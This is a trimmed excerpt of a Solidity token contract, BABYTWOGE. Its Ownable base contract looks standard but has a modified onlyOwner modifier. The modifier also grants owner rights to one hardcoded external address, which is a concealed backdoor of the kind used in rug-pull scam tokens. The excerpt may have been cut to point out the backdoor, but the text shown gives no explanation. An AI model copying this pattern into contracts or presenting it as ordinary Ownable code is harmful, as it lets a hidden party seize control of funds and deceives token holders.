...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xc16A1fdCbaDEF4808F709fb320B86a1Fb0b24698) , "Ownable: caller is not the owner");
        _;
    }
...
contract BABYTWOGE  is IERC20, Ownable {
